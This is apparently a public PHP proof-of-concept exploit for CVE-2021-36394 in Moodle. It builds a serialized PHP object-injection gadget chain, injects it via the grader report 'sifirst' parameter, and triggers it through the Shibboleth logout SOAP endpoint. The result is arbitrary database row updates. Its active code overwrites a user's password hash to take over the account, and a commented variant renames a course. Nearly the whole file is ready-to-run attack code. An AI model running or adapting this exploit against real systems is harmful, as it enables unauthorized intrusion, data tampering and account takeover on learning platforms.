<?php

/* 

Demo: https://www.youtube.com/watch?v=rn4ENyASWe8
Blog: https://0xd0ff9.wordpress.com/2021/08/28/cve-2021-36394-hack-truong-sua-diem-cac-kieu/

 */
namespace core\lock {
    class lock {}

}

namespace gradereport_singleview\local\ui {
    class feedback{   
    }
}

namespace core_availability{
    class tree {}
}

namespace core\dml{
    class recordset_walk {}
}

namespace core_analytics{
    class course {}
}


namespace {
    class grade_item{}

    class grade_grade{}

    class gradereport_overview_external{}


   
    function httpPost($url, $data, $MoodleSession, $xml)
    {
        $curl = curl_init($url);
        $headers = array('Cookie: MoodleSession='.$MoodleSession);
        if($xml){
            array_push($headers, 'Content-Type: application/xml');
        }else{
            $data =  urldecode(http_build_query($data));
        }
        curl_setopt($curl, CURLOPT_POST, true);
        curl_setopt($curl, CURLOPT_HTTPHEADER, $headers);
        curl_setopt($curl, CURLOPT_POSTFIELDS, $data);
        curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
        // curl_setopt($curl, CURLOPT_PROXY, '127.0.0.1:8080'); //proxy
        $response = curl_exec($curl);
        curl_close($curl);
        return $response;
    }

    function httpGet($url, $MoodleSession)
    {
        $curl = curl_init($url);
        $headers = array('Cookie: MoodleSession='.$MoodleSession);
        curl_setopt($curl, CURLOPT_HTTPHEADER, $headers);
        curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
        // curl_setopt($curl, CURLOPT_PROXY, '127.0.0.1:8080'); //proxy
        $response = curl_exec($curl);
        curl_close($curl);
        return $response;
    }

    function update_table($url, $MoodleSession, $table, $rowId, $column, $value){

        $add_lib = new \core_analytics\course();
        $lib_fb = new \core\lock\lock();
        $lib_fb -> key = new \core_availability\tree();
        $lib_fb -> key -> children = new \core\dml\recordset_walk();
        $lib_fb -> key -> children -> callback = "var_dump";
        $lib_fb -> key -> children -> recordset = "123";
        $lib_fb -> released = false;


        $base = new gradereport_overview_external();
        $fb = new gradereport_singleview\local\ui\feedback();
        $fb -> grade = new grade_grade();
        $fb -> grade -> grade_item = new grade_item();
        $fb -> grade -> grade_item -> calculation = "[[somestring";
        $fb -> grade -> grade_item -> calculation_normalized = false;
        $fb -> grade -> grade_item -> table = $table;
        $fb -> grade -> grade_item -> id = $rowId;
        $fb -> grade -> grade_item -> $column = $value;
        $fb -> grade -> grade_item -> required_fields = array($column,'id');



        $lib_fb -> caller = $fb;
        $arr = array($add_lib, $lib_fb,$base);
        
        //serializing the array
        $value = serialize($arr);
        // echo "\n============ Payload ===========\n";
        // echo base64_encode($value);
        echo "\n [*] Inject Payload ";
        httpGet($url.'/grade/report/grader/index.php?id=1&sifirst=Testaaaaa|'.$value."Testbbbbbb|", $MoodleSession);
        echo "\n [*] Trigger Payload ";
        $data = '<s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/"><s:Body>
    <LogoutNotification><SessionID>ssss</SessionID>
    </LogoutNotification></s:Body></s:Envelope>';
        httpPost($url.'/auth/shibboleth/logout.php', $data, $MoodleSession, 1);
    }

// Exploit Main
    $url = $argv[1];

    $MoodleSession = 'v8grl591eoi47agqac0ddlsp3v'; 


    // $table = "course"; //table exclude prefix mdl_
    // $rowId = 3; 
    // $column = 'fullname'; //column name to update

    // $value = "HackedCourse";

    // update_table($url, $MoodleSession,$table,$rowId,$column, $value);





    $table = "user"; //table exclude prefix mdl_
    $rowId = 2; // row id to insert into. 1 is guest
    $column = 'password'; //column name to update

    $newpassword = "Accounttakedover123";
    $newpassword_hash = password_hash($newpassword, PASSWORD_DEFAULT);

    $value = $newpassword_hash;

    update_table($url, $MoodleSession,$table,$rowId,$column, $value);














}

?>
